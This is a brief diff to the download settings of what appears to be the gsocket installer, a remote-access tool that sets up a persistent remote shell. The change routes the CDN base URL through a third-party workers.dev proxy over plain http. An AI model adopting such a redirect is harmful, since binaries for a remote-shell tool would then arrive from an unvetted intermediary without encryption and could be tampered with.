@@ -65,7 +65,7 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE_CDN="https://cdn.gsocket.io"
+URL_BASE_CDN="http://proxy.wingram.workers.dev/?proxyUrl=https://cdn.gsocket.io"
 URL_BASE_X="https://gsocket.io"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
